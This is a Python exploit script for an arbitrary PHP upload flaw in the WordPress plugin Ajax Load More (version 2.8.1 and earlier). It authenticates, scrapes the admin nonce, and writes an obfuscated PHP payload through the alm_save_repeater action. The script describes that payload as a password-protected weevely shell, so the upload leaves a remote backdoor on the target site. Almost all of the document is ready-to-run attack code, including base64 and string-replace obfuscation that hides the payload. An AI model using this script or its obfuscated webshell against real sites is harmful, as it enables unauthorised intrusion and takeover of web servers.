import requests
import sys
import re
import subprocess
from lxml import html

# Exploit Title: Ajax Load More Arbitrary php Upload
# Date: january 20th 2016
# Exploit Author: Shad0
# Vendor Homepage: https://connekthq.com/security-exploit-ajax-load-more/
# Version: <= 2.8.1
# Tested on: Debian 7 - Wordpress 4.3.1 - Ajax Load More Version 2.8.0

#This exploits the arbitrary php upload vulnerability in the Wordpress Plugin Ajax Load More version <= 2.8.1. 
#The default payload is a weevely bind shell with the password shado. If youd like to use a different payload just input the desired php code in the shell variable.
#This php code will be executed when the page is visited usually located in http://{target}/wp-content/plugins/ajax-load-more/core/repeater/default.php

print("""                                                                                                                                                                                                        
                                                                                                                                                                                                        
                                                                                                                                                                                                        
                                            `----...````                                                                                               ````````                                         
                                           ``/ddhhyso+/::--..```````                                                                         `````...-::/++ooo.`                                        
                                            `.+mMMMMMNNmmdhyyso++//:::---..```                                                  `````.....--::/++osyhdmmNNMMh:``                                        
                                             `-/hNMMMMMMMMMMMMMMNNNmmmdddhys+:.``                                           `.-:/+oosssyyhddmmNNNMMMMMMMMMNy:.`                                         
                                              `.:odNMMMMMMMMMMMMMMMMMMMMMMMMNmy+:.`                                      `.-/shmNMMMMMMMMMMMMMMMMMMMMMMMNdo-.`                                          
                                                `.:odNMMMMMMMMMMMMMMMMMMMMMMMMMNdo:.`                                  `.-+hNMMMMMMMMMMMMMMMMMMMMMMMMMNdo:.`                                            
                                                  `.:ohNMMMMMMMMMMMMMMMMMMMMMMMMMNh/.`                                `-+hNMMMMMMMMMMMMMMMMMMMMMMMMMNdo:.`                                              
                                                    ``-/shNMMMMMMMMMMMMMMMMMMMMMMMMd:.`                              `-omMMMMMMMMMMMMMMMMMMMMMMMMNmy+-.`                                                
                                                       `.-/oydmNMMMMMMMMMMMMMMMMNmhs:`                               `-hNMMMMMMMMMMMMMMMMMMMMMNdy+:.``                                                  
                                                          ``.-:/osyhdddddddhhys+/:-.`                                ``.:+shdmNNNMMMMMNNmmdys+:-.``                                                     
                                                               ```...------...```                                       ``..--:///+++///:--.```                                                         
                                                                                                                               `````````                                                                
                    
                                          ``.-`                                                                                                            ``                                           
                                           .++-                                                                                                           `-:/`                                         
                                           .oo:::-`                                                                                                      .:-.``                                         
                                           `sy/ssso.. `..``                                                                                         `---` +ss.                                          
                                            `-.o+/+o/+osssyo ``  ````                                                                   ```.``   -- .+ooo ::.                                           
                                               `:yyso/ooss+-/o.:ooossso:      `..--.`       `...`           `.`        `..-::-.    .  .+ooooss: .os+```-/.                                              
                                                `+yys-soo:/ooo-oooosssyo `/`:+oossyy.`::   :+ossso/`   `.:/osyy/     -+oooosssso` .s+``/ooooos-`+osss.                                                  
                                                  .:+`/s-+oooo:+ooooos+`.+o`oooooos:.oyo  :sooossyy+ -`.osoossyy   ``syssoooooss/`+sso-`-+ooo+`:ooosy+                                                  
                                                      `--yssoo+:ooooo/`:ooo.oooooo/-osss` /ooooooso`.o/ :sooosso  :+``/sssoooooo/:ooooo:``/oo. -++//:`                                                  
                                                        .yhysso.+ooo/./oooo-/oooo/:ooooo/ :oooooo+``+oo.`+oooos: .os+` ./ssoooo+:oooooss/``/-                                                           
                                                         `:osss..ss/.+ooooo+.ooo/-ooooooo.`oooooo. /ooo+`-ooooo.`osss/   -ssso+-+ooooossy/                                                              
                                                            ``.  -o.ssssoooo./s+.oooooooo+`-oooo- :ooooo/ /ooo/`+oosss.  `sss/.+sssooooo/.                                                              
                                                                  `.ossssooo-.o.:sssoooooo/`/ss/ :ooooooo..ooo./ooooss+  :o+- `+o++/-..`                                                                
                                                                     `......` . /yyyssoooo+.`+s`.ysssoooo/ oo-:sssoosss `-`                                                                             
                                                                                 .-:::--.``  `. .+ssooo+/- /- -+oooo+o+                                                                                 
                                                                                                   `````         `````                                                                                  
                                                                                                                                                                                                   """);
print "[+] Ajax Load More version<= 2.8.1.1 Arbitrary php file upload - Script by Shad0 \n"
print "[*] For those like me who avoid using metasploit at all costs"
print "[*] Tested on Plugin version 2.8.0 running on wordpress 4.3.1"
print "[*] Quick and dirty exploit for Wordpress Ajax Load More version <= 2.8.1 \n"
print "[*] Usage: ajax_load_more.py <Valid-Wp-username> <Valid-wp-password> <target> "
print "[!] Example: python ajax_load_more.py Shad0 123456 http://www.wordpressblog.com \n"

if len(sys.argv)!=4:
 print "[!] Come on i need some arguments!"
 print "[*] Usage: ajax_load_more.py <Valid-Wp-username> <Valid-wp-password> <target> "
 exit()

EMAIL = sys.argv[1]
PASSWORD = sys.argv[2]
URL = sys.argv[3]+'/wp-login.php'

#Target url to exploit
TARGET = sys.argv[3]+'/wp-admin/admin-ajax.php'

shell="""
    <?php
    $dhuk="uKwwGFycmF5wwX3NsaWNlKCRhLCwwRwwjKCRhKS0wwzKSkpKSk7ZWNowwbyAnwwPC8nLiRwwrLwwic+Jzt9";
    $gkae="cHJlZ1ww9ywwZXBsYWNlKGFycmF5KCcvW15cdz1wwcc10wwvJywnL1xzLycpLCBhcnJhewwSwwgwwnJywnKycpLCBqb2l";
    $qgwt = str_replace("sr","","srssrtsrr_resrplsracsre");
    $dobw="rPSdhwwZG8wwnO2VwwjaG8gwwJzwnwwLiwwRrwwLic+JztwwldmwwFsKGJwwhc2U2NF9kZWNvZGUo";
    $atgg="JGM9J2NvdWww50JzskYT0kX0NPT0tJRTtwwpZihywwZXNldCgkwwYSwwk9PSdzwwaCcgJiwwYwwgJGMoJGEpPjMpeyR";
    $kbjx = $qgwt("h", "", "hbhaseh6h4h_hdhehchohdhe");
    $fsfr = $qgwt("cc","","cccrcceacctecc_ccfccuccnccccctcciccoccn");
    $tbhd = $fsfr("", $kbjx($qgwt("ww", "", $atgg.$dobw.$gkae.$dhuk))); $tbhd();
    ?>
    """

def main():
    
    print "[*] Making sure the plugin exists...."
    check = requests.get(sys.argv[3]+'/wp-content/plugins/ajax-load-more/')

    if check.status_code==200:
	print "[+] Awsome, looks like the plugin is there!"
    else:
	print "[-] Hmm...Does not look good, got ", check.status_code, "... Proceeding anyways..."
	print "[!] If exploit fails manually check the wp-content directory, or the provided url..."

    session = requests.session(config={'verbose': sys.stderr})
    	
    login_data = {
        'log': EMAIL,
        'pwd': PASSWORD,
        'wp-submit': 'Log+In',
    }

    print "[*] Sending authentication data...\n"
    
    r = session.post(URL, data=login_data)
 
    # Try accessing a page that requires you to be logged in
    r = session.head(sys.argv[3]+'/wp-admin/')
    
    if r.status_code!=200:
	print"[!] Sorry, doesnt look like you have valid credentials... Terminating."
	exit()
    else:
        print "[+] Success!! Authenticated. Now onto the fun stuff\n"

    print "[*] Trying to get the Nonce..."

    #Lets obtain the nonce	
    nonce_payload = {

	'page':'ajax-load-more-repeaters',
    }
    r = session.get(sys.argv[3]+'/wp-admin/admin.php', params=nonce_payload)
    nonce="null"

    print "[*] Parsing results...\n"
    tree = html.fromstring(r.text)
    buyers = tree.xpath('//script[@type="text/javascript"]/text()')
    for line in buyers:
	if "alm_admin_nonce" in line:
	    nonce_line=re.findall('".+?"', line)
	    nonce=nonce_line[3]
	    nonce = re.sub(r'^"|"$', '', nonce)
    if nonce!="null":
	    print"[+] Got the nonce!!! \n   [+]Nonce: "+ nonce 
    else:
	    print "\n[-] Bad news, no nonce. Terminating..."
	    exit()

    print "[*] Sending shell..."

    attack_vars= {
	'action': 'alm_save_repeater',
	'nonce': nonce,
	'type': 'default',
	'repeater': 'default',
	'value':shell
    }
    r = session.post(sys.argv[3]+"/wp-admin/admin-ajax.php", data=attack_vars)
    
    check2 = requests.get(sys.argv[3]+'/wp-content/plugins/ajax-load-more/core/repeater/default.php')
    if check.status_code==200:
	print "[*] default.php created"
	print "[+] Done! Shell should be accessible through "+ sys.argv[3]+"/wp-content/plugins/ajax-load-more/core/repeater/default.php (if weevely default, password shado)"
    else:
	print "[-] default.php not present. Looks like this version isnt vulnerable. "
	print "[*] Check /wp-content/plugins/ajax-load-more/README.txt for version number"

if __name__ == '__main__':
    main()

